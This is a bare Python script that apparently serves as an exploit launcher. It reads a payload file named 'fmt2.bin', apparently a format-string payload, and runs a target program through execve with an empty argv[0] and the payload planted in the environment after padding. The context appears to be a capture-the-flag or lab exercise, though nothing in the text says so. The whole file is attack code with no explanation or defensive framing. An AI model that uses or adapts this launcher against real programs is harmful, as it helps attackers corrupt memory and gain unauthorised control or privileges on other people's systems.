import ctypes, sys, os
fmt = open("fmt2.bin","rb").read()
argv = [b""] + [None]
env = [b"PADPAD", fmt] + [None]
libc = ctypes.CDLL("libc.so.6")
ARGV = (ctypes.c_char_p * len(argv))(*argv)
ENVP = (ctypes.c_char_p * len(env))(*env)
libc.execve(sys.argv[1].encode(), ARGV, ENVP)
